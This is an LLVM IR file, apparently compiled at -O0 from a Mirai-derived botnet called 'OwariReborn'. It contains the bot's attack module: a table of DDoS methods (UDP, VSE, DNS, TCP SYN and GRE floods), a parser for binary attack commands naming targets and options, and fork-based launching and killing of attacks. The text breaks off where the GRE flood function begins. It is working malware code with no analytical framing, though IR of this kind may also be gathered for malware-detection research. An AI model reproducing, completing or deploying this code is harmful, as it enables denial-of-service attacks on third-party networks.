; ModuleID = 'host/ir_O0/OwariReborn.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] [i32 5, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [43 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 322420947, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 8
  br i1 %4, label %5, label %24

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %1, align 4
  br label %2

; <label>:24:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %219

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %17
  br label %219

; <label>:31:                                     ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %31
  br label %219

; <label>:42:                                     ; preds = %31
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  %45 = load i8, i8* %43, align 1
  store i8 %45, i8* %8, align 1
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = sub i64 %47, 1
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %4, align 4
  %50 = load i8, i8* %8, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  br label %219

; <label>:54:                                     ; preds = %42
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i64
  %59 = mul i64 5, %58
  %60 = icmp ult i64 %56, %59
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %54
  br label %219

; <label>:62:                                     ; preds = %54
  %63 = load i8, i8* %8, align 1
  %64 = zext i8 %63 to i64
  %65 = call noalias i8* @calloc(i64 %64, i64 24) #6
  %66 = bitcast i8* %65 to %struct.attack_target*
  store %struct.attack_target* %66, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %67

; <label>:67:                                     ; preds = %114, %62
  %68 = load i32, i32* %5, align 4
  %69 = load i8, i8* %8, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %117

; <label>:72:                                     ; preds = %67
  %73 = load i8*, i8** %3, align 8
  %74 = bitcast i8* %73 to i32*
  %75 = load i32, i32* %74, align 4
  %76 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 1
  store i32 %75, i32* %80, align 4
  %81 = load i8*, i8** %3, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 4
  store i8* %82, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %3, align 8
  %85 = load i8, i8* %83, align 1
  %86 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 2
  store i8 %85, i8* %90, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 5
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %4, align 4
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 %106, i32* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %72
  %115 = load i32, i32* %5, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %5, align 4
  br label %67

; <label>:117:                                    ; preds = %67
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = icmp ult i64 %119, 1
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %117
  br label %219

; <label>:122:                                    ; preds = %117
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %3, align 8
  %125 = load i8, i8* %123, align 1
  store i8 %125, i8* %9, align 1
  %126 = load i32, i32* %4, align 4
  %127 = sext i32 %126 to i64
  %128 = sub i64 %127, 1
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %4, align 4
  %130 = load i8, i8* %9, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sgt i32 %131, 0
  br i1 %132, label %133, label %211

; <label>:133:                                    ; preds = %122
  %134 = load i8, i8* %9, align 1
  %135 = zext i8 %134 to i64
  %136 = call noalias i8* @calloc(i64 %135, i64 16) #6
  %137 = bitcast i8* %136 to %struct.attack_option*
  store %struct.attack_option* %137, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %138

; <label>:138:                                    ; preds = %207, %133
  %139 = load i32, i32* %5, align 4
  %140 = load i8, i8* %9, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %210

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* %4, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp ult i64 %145, 1
  br i1 %146, label %147, label %148

; <label>:147:                                    ; preds = %143
  br label %219

; <label>:148:                                    ; preds = %143
  %149 = load i8*, i8** %3, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 1
  store i8* %150, i8** %3, align 8
  %151 = load i8, i8* %149, align 1
  %152 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %155, i32 0, i32 1
  store i8 %151, i8* %156, align 8
  %157 = load i32, i32* %4, align 4
  %158 = sext i32 %157 to i64
  %159 = sub i64 %158, 1
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %4, align 4
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %148
  br label %219

; <label>:165:                                    ; preds = %148
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  store i8 %168, i8* %12, align 1
  %169 = load i32, i32* %4, align 4
  %170 = sext i32 %169 to i64
  %171 = sub i64 %170, 1
  %172 = trunc i64 %171 to i32
  store i32 %172, i32* %4, align 4
  %173 = load i32, i32* %4, align 4
  %174 = load i8, i8* %12, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %165
  br label %219

; <label>:178:                                    ; preds = %165
  %179 = load i8, i8* %12, align 1
  %180 = zext i8 %179 to i32
  %181 = add nsw i32 %180, 1
  %182 = sext i32 %181 to i64
  %183 = call noalias i8* @calloc(i64 %182, i64 1) #6
  %184 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %187, i32 0, i32 0
  store i8* %183, i8** %188, align 8
  %189 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = load i8*, i8** %3, align 8
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  call void @util_memcpy(i8* %194, i8* %195, i32 %197)
  %198 = load i8, i8* %12, align 1
  %199 = zext i8 %198 to i32
  %200 = load i8*, i8** %3, align 8
  %201 = sext i32 %199 to i64
  %202 = getelementptr inbounds i8, i8* %200, i64 %201
  store i8* %202, i8** %3, align 8
  %203 = load i8, i8* %12, align 1
  %204 = zext i8 %203 to i32
  %205 = load i32, i32* %4, align 4
  %206 = sub nsw i32 %205, %204
  store i32 %206, i32* %4, align 4
  br label %207

; <label>:207:                                    ; preds = %178
  %208 = load i32, i32* %5, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %5, align 4
  br label %138

; <label>:210:                                    ; preds = %138
  br label %211

; <label>:211:                                    ; preds = %210, %122
  %212 = call i32* @__errno_location() #7
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* %6, align 4
  %214 = load i8, i8* %7, align 1
  %215 = load i8, i8* %8, align 1
  %216 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %217 = load i8, i8* %9, align 1
  %218 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %213, i8 zeroext %214, i8 zeroext %215, %struct.attack_target* %216, i8 zeroext %217, %struct.attack_option* %218)
  br label %219

; <label>:219:                                    ; preds = %211, %177, %164, %147, %121, %61, %53, %41, %30, %16
  %220 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %221 = icmp ne %struct.attack_target* %220, null
  br i1 %221, label %222, label %225

; <label>:222:                                    ; preds = %219
  %223 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %224 = bitcast %struct.attack_target* %223 to i8*
  call void @free(i8* %224) #6
  br label %225

; <label>:225:                                    ; preds = %222, %219
  %226 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %227 = icmp ne %struct.attack_option* %226, null
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %225
  %229 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %230 = load i8, i8* %9, align 1
  %231 = zext i8 %230 to i32
  call void @free_opts(%struct.attack_option* %229, i32 %231)
  br label %232

; <label>:232:                                    ; preds = %228, %225
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %14, align 4
  %25 = load i8, i8* @methods_len, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp slt i32 %24, %26
  br i1 %27, label %28, label %57

; <label>:28:                                     ; preds = %23
  %29 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %29, i64 %31
  %33 = load %struct.attack_method*, %struct.attack_method** %32, align 8
  %34 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %33, i32 0, i32 1
  %35 = load i8, i8* %34, align 8
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* %8, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %28
  %41 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %42 = load i32, i32* %14, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %41, i64 %43
  %45 = load %struct.attack_method*, %struct.attack_method** %44, align 8
  %46 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %45, i32 0, i32 0
  %47 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = load i32, i32* %7, align 4
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %51 = load i8, i8* %11, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %47(i32 %48, i8 zeroext %49, %struct.attack_target* %50, i8 zeroext %51, %struct.attack_option* %52)
  br label %57

; <label>:53:                                     ; preds = %28
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %14, align 4
  br label %23

; <label>:57:                                     ; preds = %40, %23
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %36

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %33

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  br label %10

; <label>:33:                                     ; preds = %10
  %34 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %35 = bitcast %struct.attack_option* %34 to i8*
  call void @free(i8* %35) #6
  br label %36

; <label>:36:                                     ; preds = %33, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11

; <label>:38:                                     ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

; <label>:40:                                     ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
